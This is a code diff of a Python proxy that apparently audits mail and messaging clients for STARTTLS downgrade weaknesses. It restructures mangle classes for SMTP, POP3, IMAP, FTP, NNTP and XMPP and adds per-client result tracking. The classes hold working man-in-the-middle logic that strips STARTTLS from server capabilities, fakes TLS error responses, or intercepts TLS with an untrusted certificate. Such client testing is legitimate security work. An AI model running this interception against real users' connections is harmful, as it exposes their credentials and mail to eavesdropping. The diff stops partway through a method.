@@ -204,8 +204,8 @@ class Session(object):
     def outbound_starttls(self, session, sslctx=None): 
         raise NotImplementedError("Implement this in proto class")
     
-    def mangle_client_data(self, session, data): return data
-    def mangle_server_data(self, session, data): return data
+    def mangle_client_data(self, session, data, rewrite): return data
+    def mangle_server_data(self, session, data, rewrite): return data
     
 class ProxyServer(object):
     '''Proxy Class'''
@@ -268,454 +268,540 @@ class ProxyServer(object):
                         self.inbound.remove(sock)
                     raise        
 
-class SMTP:
-    class StripFromCapabilities:
-        ''' 1) Force Server response to *NOT* announce STARTTLS support
-            2) raise exception if client tries to negotiated STARTTLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
-                features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
-                if not features[-1].startswith("250 "):
-                    features[-1] = features[-1].replace("250-","250 ")  # end marker
-                data = '\r\n'.join(features)+'\r\n' 
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
-            return data
-        
-    class StripWithInvalidResponseCode:
-        ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
-            2) Respond to client STARTTLS with invalid response code
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
-                features = list(data.strip().split("\r\n"))
-                features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
-                #if "STARTTLS" in data:
-                #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
-                data = '\r\n'.join(features)+'\r\n' 
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                session.inbound.sendall("200 STRIPTLS\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
-                data=None
-            return data
-        
-    class StripWithTemporaryError:
-        ''' 1) force server error on client sending STARTTLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                session.inbound.sendall("454 TLS not available due to temporary reason\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("454 TLS not available due to temporary reason\r\n")))
-                data=None
-            return data
-
-    class StripWithError:
-        ''' 1) force server error on client sending STARTTLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                session.inbound.sendall("501 Syntax error\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("501 Syntax error\r\n")))
-                data=None
-            return data
-        
-    class UntrustedIntercept:
-        ''' 1) Do not mangle server data
-            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
-               in case client does not check keys
-        '''
-        TLS_CERTFILE = "server.pem"
-        TLS_KEYFILE = "server.pem"
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                # do inbound STARTTLS
-                session.inbound.sendall("220 Go ahead\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("220 Go ahead\r\n")))
-                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
-                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
-                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
-                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
-                # outbound ssl
-                
-                session.outbound.sendall(data)
-                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-                resp_data = session.outbound.recv()
-                if "220" not in resp_data:
-                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
-                
-                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
-                session.outbound.ssl_wrap_socket()
-
-                data=None
-            return data
-
-class POP3:
-    class StripWithError:
-        ''' 1) force server error on client sending STLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "stls" == data.strip().lower():
-                session.inbound.sendall("-ERR unknown command\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
-                data=None
-            return data
-
-    class UntrustedIntercept:
-        ''' 1) Do not mangle server data
-            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
-               in case client does not check keys
-        '''
-        TLS_CERTFILE = "server.pem"
-        TLS_KEYFILE = "server.pem"
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "stls"==data.strip().lower():
-                # do inbound STARTTLS
-                session.inbound.sendall("+OK Begin TLS negotiation\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("+OK Begin TLS negotiation\r\n")))
-                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
-                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
-                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
-                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
-                # outbound ssl
-                
-                session.outbound.sendall(data)
-                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-                resp_data = session.outbound.recv()
-                if "+OK" not in resp_data:
-                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
-                
-                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
-                session.outbound.ssl_wrap_socket()
-
-                data=None
-            return data
-        
-class IMAP:
-    class StripFromCapabilities:
-        ''' 1) Force Server response to *NOT* announce STARTTLS support
-            2) raise exception if client tries to negotiated STARTTLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if "CAPABILITY " in data:
-                data = data.replace(" STARTTLS","")
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
-            return data
-        
-    class StripWithError:
-        ''' 1) force server error on client sending STLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if data.strip().lower().endswith("starttls"):
-                id = data.split(' ',1)[0].strip()
-                session.inbound.sendall("%s BAD unknown command\r\n"%id)
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
-                data=None
-            return data
-
-    class UntrustedIntercept:
-        ''' 1) Do not mangle server data
-            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
-               in case client does not check keys
-        '''
-        TLS_CERTFILE = "server.pem"
-        TLS_KEYFILE = "server.pem"
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if data.strip().lower().endswith("starttls"):
-                id = data.split(' ',1)[0].strip()
-                # do inbound STARTTLS
-                session.inbound.sendall("%s OK Begin TLS negotation now\r\n"%id)
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s OK Begin TLS negotation now\r\n"%id)))
-                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
-                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
-                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
-                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
-                # outbound ssl
-                
-                session.outbound.sendall(data)
-                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-                resp_data = session.outbound.recv()
-                if "%s OK"%id not in resp_data:
-                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
-                
-                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
-                session.outbound.ssl_wrap_socket()
-
-                data=None
-            return data
-        
-class FTP:
-    class StripFromCapabilities:
-        ''' 1) Force Server response to *NOT* announce AUTH TLS support
-            2) raise exception if client tries to negotiated AUTH TLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if session.outbound.sndbuf.strip().lower()=="feat" \
-                and "AUTH TLS" in data:
-                features = (f for f in data.strip().split('\n') if not "AUTH TLS" in f)
-                data = '\n'.join(features)+"\r\n"
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
-            return data
+class Tests:
+    _TLS_CERTFILE = "server.pem"
+    _TLS_KEYFILE = "server.pem"
+    class SMTP:
+        _PORT = 25
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
+                    features = [f for f in data.strip().split('\r\n') if not "STARTTLS" in f]
+                    if not features[-1].startswith("250 "):
+                        features[-1] = features[-1].replace("250-","250 ")  # end marker
+                    data = '\r\n'.join(features)+'\r\n' 
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                elif "mail from" in data.lower():
+                    rewrite.set_result(session, True)
+                return data
+            
+        class StripWithInvalidResponseCode:
+            ''' 1) Force Server response to contain STARTTLS even though it does not support it (just because we can)
+                2) Respond to client STARTTLS with invalid response code
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if any(e in session.outbound.sndbuf.lower() for e in ('ehlo','helo')) and "250" in data:
+                    features = list(data.strip().split("\r\n"))
+                    features.insert(-1,"250-STARTTLS")     # add STARTTLS from capabilities
+                    #if "STARTTLS" in data:
+                    #    features = [f for f in features if not "STARTTLS" in f]    # remove STARTTLS from capabilities
+                    data = '\r\n'.join(features)+'\r\n' 
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    session.inbound.sendall("200 STRIPTLS\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("200 STRIPTLS\r\n")))
+                    data=None
+                elif "mail from" in data.lower():
+                    rewrite.set_result(session, True)
+                return data
+            
+        class StripWithTemporaryError:
+            ''' 1) force server error on client sending STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    session.inbound.sendall("454 TLS not available due to temporary reason\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("454 TLS not available due to temporary reason\r\n")))
+                    data=None
+                elif "mail from" in data.lower():
+                    rewrite.set_result(session, True)
+                return data
     
-    class StripWithError:
-        ''' 1) force server error on client sending AUTH TLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "AUTH TLS" in data:
-                session.inbound.sendall("500 AUTH TLS not understood\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
-                data=None
-            return data
-
-    class UntrustedIntercept:
-        ''' 1) Do not mangle server data
-            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
-               in case client does not check keys
-        '''
-        TLS_CERTFILE = "server.pem"
-        TLS_KEYFILE = "server.pem"
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "AUTH TLS" in data:
-                # do inbound STARTTLS
-                session.inbound.sendall("234 OK Begin TLS negotation now\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("234 OK Begin TLS negotation now\r\n")))
-                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
-                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
-                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
-                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
-                # outbound ssl
-                
-                session.outbound.sendall(data)
-                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-                resp_data = session.outbound.recv()
-                if not resp_data.startswith("234"):
-                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
-                
-                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
-                session.outbound.ssl_wrap_socket()
-
-                data=None
-            return data
-        
-class NNTP:
-    class StripFromCapabilities:
-        ''' 1) Force Server response to *NOT* announce AUTH TLS support
-            2) raise exception if client tries to negotiated AUTH TLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if session.outbound.sndbuf.strip().lower()=="capabilities" \
-                and "STARTTLS" in data:
-                features = (f for f in data.strip().split('\n') if not "STARTTLS" in f)
-                data = '\n'.join(features)+"\r\n"
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
-            return data
+        class StripWithError:
+            ''' 1) force server error on client sending STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    session.inbound.sendall("501 Syntax error\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("501 Syntax error\r\n")))
+                    data=None
+                elif "mail from" in data.lower():
+                    rewrite.set_result(session, True)
+                return data
+            
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    # do inbound STARTTLS
+                    session.inbound.sendall("220 Go ahead\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("220 Go ahead\r\n")))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Tests._TLS_CERTFILE, 
+                                            keyfile=Tests._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if "220" not in resp_data:
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
     
-    class StripWithError:
-        ''' 1) force server error on client sending AUTH TLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
-                data=None
-            return data
-
-    class UntrustedIntercept:
-        ''' 1) Do not mangle server data
-            2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
-               in case client does not check keys
-        '''
-        TLS_CERTFILE = "server.pem"
-        TLS_KEYFILE = "server.pem"
-        @staticmethod
-        def mangle_server_data(session, data):
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "STARTTLS" in data:
-                # do inbound STARTTLS
-                session.inbound.sendall("382 Continue with TLS negotiation\r\n")
-                logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("382 Continue with TLS negotiation\r\n")))
-                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-                context.load_cert_chain(certfile=SMTP.UntrustedIntercept.TLS_CERTFILE, 
-                                        keyfile=SMTP.UntrustedIntercept.TLS_KEYFILE)
-                session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
-                logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
-                # outbound ssl
-                
-                session.outbound.sendall(data)
-                logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
-                resp_data = session.outbound.recv()
-                if not resp_data.startswith("382"):
-                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
-                
-                logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
-                session.outbound.ssl_wrap_socket()
-
-                data=None
-            return data
-
-class XMPP:
-    class StripFromCapabilities:
-        ''' 1) Force Server response to *NOT* announce STARTTLS support
-            2) raise exception if client tries to negotiated STARTTLS
-        '''
-        @staticmethod
-        def mangle_server_data(session, data):
-            if "<starttls" in data:
-                start = data.index("<starttls")
-                end = data.index("</starttls>",start)+len("</starttls>")
-                data = data[:start] + data[end:]        # strip starttls from capabilities
-            return data
-        @staticmethod
-        def mangle_client_data(session, data):
-            if "<starttls" in data:
-                # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
-                #<failure/> or <proceed/>
-                raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
-                #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
-                #data=None
-            return data 
+                    data=None
+                elif "mail from" in data.lower():
+                    rewrite.set_result(session, True)
+                return data
+    
+    class POP3:
+        _PORT = 110
+        class StripWithError:
+            ''' 1) force server error on client sending STLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "stls" == data.strip().lower():
+                    session.inbound.sendall("-ERR unknown command\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("-ERR unknown command\r\n")))
+                    data=None
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "stls"==data.strip().lower():
+                    # do inbound STARTTLS
+                    session.inbound.sendall("+OK Begin TLS negotiation\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("+OK Begin TLS negotiation\r\n")))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Tests._TLS_CERTFILE, 
+                                            keyfile=Tests._TLS_CERTFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if "+OK" not in resp_data:
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                return data
+            
+    class IMAP:
+        _PORT = 143
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if "CAPABILITY " in data:
+                    data = data.replace(" STARTTLS","")
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                return data
+            
+        class StripWithError:
+            ''' 1) force server error on client sending STLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if data.strip().lower().endswith("starttls"):
+                    id = data.split(' ',1)[0].strip()
+                    session.inbound.sendall("%s BAD unknown command\r\n"%id)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s BAD unknown command\r\n"%id)))
+                    data=None
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if data.strip().lower().endswith("starttls"):
+                    id = data.split(' ',1)[0].strip()
+                    # do inbound STARTTLS
+                    session.inbound.sendall("%s OK Begin TLS negotation now\r\n"%id)
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("%s OK Begin TLS negotation now\r\n"%id)))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Tests._TLS_CERTFILE, 
+                                            keyfile=Tests._TLS_CERTFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if "%s OK"%id not in resp_data:
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                return data
+            
+    class FTP:
+        _PORT = 21
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce AUTH TLS support
+                2) raise exception if client tries to negotiated AUTH TLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if session.outbound.sndbuf.strip().lower()=="feat" \
+                    and "AUTH TLS" in data:
+                    features = (f for f in data.strip().split('\n') if not "AUTH TLS" in f)
+                    data = '\n'.join(features)+"\r\n"
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                return data
+        
+        class StripWithError:
+            ''' 1) force server error on client sending AUTH TLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "AUTH TLS" in data:
+                    session.inbound.sendall("500 AUTH TLS not understood\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("500 AUTH TLS not understood\r\n")))
+                    data=None
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "AUTH TLS" in data:
+                    # do inbound STARTTLS
+                    session.inbound.sendall("234 OK Begin TLS negotation now\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("234 OK Begin TLS negotation now\r\n")))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Tests._TLS_CERTFILE, 
+                                            keyfile=Tests._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if not resp_data.startswith("234"):
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                return data
+            
+    class NNTP:
+        _PORT = 119
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce AUTH TLS support
+                2) raise exception if client tries to negotiated AUTH TLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if session.outbound.sndbuf.strip().lower()=="capabilities" \
+                    and "STARTTLS" in data:
+                    features = (f for f in data.strip().split('\n') if not "STARTTLS" in f)
+                    data = '\n'.join(features)+"\r\n"
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                return data
+        
+        class StripWithError:
+            ''' 1) force server error on client sending AUTH TLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    session.inbound.sendall("502 Command unavailable\r\n")  # or 580 Can not initiate TLS negotiation
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("502 Command unavailable\r\n")))
+                    data=None
+                return data
+    
+        class UntrustedIntercept:
+            ''' 1) Do not mangle server data
+                2) intercept client STARTLS, negotiated ssl_context with client and one with server, untrusted.
+                   in case client does not check keys
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "STARTTLS" in data:
+                    # do inbound STARTTLS
+                    session.inbound.sendall("382 Continue with TLS negotiation\r\n")
+                    logging.debug("%s [client] <= [server][mangled] %s"%(session,repr("382 Continue with TLS negotiation\r\n")))
+                    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+                    context.load_cert_chain(certfile=Tests._TLS_CERTFILE, 
+                                            keyfile=Tests._TLS_KEYFILE)
+                    session.inbound.ssl_wrap_socket_with_context(context, server_side=True)
+                    logging.debug("%s [client] <= [server][mangled] waiting for inbound SSL Handshake"%(session))
+                    # outbound ssl
+                    
+                    session.outbound.sendall(data)
+                    logging.debug("%s [client] => [server]          %s"%(session,repr(data)))
+                    resp_data = session.outbound.recv()
+                    if not resp_data.startswith("382"):
+                        raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(resp_data))
+                    
+                    logging.debug("%s [client] => [server][mangled] performing outbound SSL handshake"%(session))
+                    session.outbound.ssl_wrap_socket()
+    
+                    data=None
+                return data
+    
+    class XMPP:
+        _PORT = 5222
+        class StripFromCapabilities:
+            ''' 1) Force Server response to *NOT* announce STARTTLS support
+                2) raise exception if client tries to negotiated STARTTLS
+            '''
+            @staticmethod
+            def mangle_server_data(session, data, rewrite):
+                if "<starttls" in data:
+                    start = data.index("<starttls")
+                    end = data.index("</starttls>",start)+len("</starttls>")
+                    data = data[:start] + data[end:]        # strip starttls from capabilities
+                return data
+            @staticmethod
+            def mangle_client_data(session, data, rewrite):
+                if "<starttls" in data:
+                    # do not respond with <proceed xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>
+                    #<failure/> or <proceed/>
+                    raise ProtocolViolationException("whoop!? client sent STARTTLS even though we did not announce it.. proto violation: %s"%repr(data))
+                    #session.inbound.sendall("<success xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>")  # fake respone
+                    #data=None
+                return data 
 
 class RewriteDispatcher(object):
     def __init__(self):
-        self.attacks = {}   # proto:[attacks]
+        self.mangles = {}   # proto:[attacks]
+        self.results = []   # [ {session,client_ip,mangle,result}, }
+        self.session_to_mangle = {}  # session:mangle
         
     def __repr__(self):
-        return "<RewriteDispatcher attacks=%s>"%repr(self.attacks)
+        return "<RewriteDispatcher rules=%s>"%repr(self.mangles)
     
+    def get_results(self):
+        return self.results
+    
+    def get_results_by_clients(self):
+        results = {}    #client:{mangle:result}
+        for r in self.get_results():
+            client = r['client']
+            results.setdefault(client,[])
+            mangle = r['mangle']
+            result = r['result']
+            results[client].append((mangle,result))
+        return results
+    
+    def get_result(self, session):
+        for r in self.get_results():
+            if r['session']==session:
+                return r
+        return None
+    
+    def set_result(self, session, value):
+        r = self.get_result(session)
+        r['result'] = value
+          
     def add(self, proto, attack):
-        self.attacks.setdefault(proto,set([]))
-        self.attacks[proto].add(attack)
+        self.mangles.setdefault(proto,set([]))
+        self.mangles[proto].add(attack)
         
-    def get_attack(self, proto):
-        return self.attacks.get(proto,[])
+    def get_mangle(self, session):
+        ''' smart select mangle
+            return same mangle for same session
+            return different for different session
+            try to use all mangles for same client-ip
+        '''
+        # 1) session already has a mangle associated to it
+        mangle = self.session_to_mangle.get(session)
+        if mangle:
+            return mangle
+        # 2) pick new mangle (round-robin) per client
+        #    
+        client_ip = session.inbound.peer[0]
+        client_mangle_history = [r for r in self.get_results() if r['client']==client_ip]
+        
